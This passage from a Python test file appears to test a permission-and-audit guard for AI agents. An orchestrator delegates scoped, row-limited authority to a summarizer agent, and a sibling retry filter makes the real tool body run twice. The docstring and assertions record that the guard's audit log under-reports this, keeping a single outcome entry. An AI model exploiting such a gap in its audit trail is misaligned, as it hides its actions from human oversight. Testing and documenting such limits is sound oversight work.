    before writing this assertion (not assumed): the real body runs twice, but this guard's own
    `await next(context)` is awaited exactly once and returns once with the FINAL attempt's
    `context.result`. One honest record, not corrupted, but silently under-reporting that the
    real body ran more than once -- the documented "guard outer, sibling retries" residual,
    distinct from the short-circuit case above."""
    tools = demo.CrmTools()
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*"}, ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600),
        schema_version=2)
    chain = dg_sk.DelegationChain(root_agent="Orchestrator", root_guard=root)
    child = root.delegate("summarizer", Authority(
        scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize")
    chain.bind("Summarizer", child)

    kernel = Kernel()
    kernel.add_plugin(tools, plugin_name="Crm")

    async def retrying_sibling(context, next) -> None:
        await next(context)   # first attempt, discarded by the sibling
        await next(context)   # final attempt, what the model actually sees

    dg_sk.attach_guard(kernel, agent_name="Summarizer", chain=chain, policies=demo.POLICIES,
                       strict_single_hook=True)  # guard OUTER: added first
    kernel.add_filter(FilterTypes.FUNCTION_INVOCATION, retrying_sibling)

    result = asyncio.run(kernel.invoke(
        plugin_name="Crm", function_name="crm_query", arguments=KernelArguments(rows=100)))
    assert tools.crm_query_calls == [100, 100], "the real body ran twice"
    assert result is not None

    entries = root.audit_log().entries
    assert len([e for e in entries if e["event"] == "allow"]) == 1
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert len(outcomes) == 1, "exactly one honest record, not two, not a duplicate error"
    assert outcomes[0]["body_state"] == BodyState.RETURNED
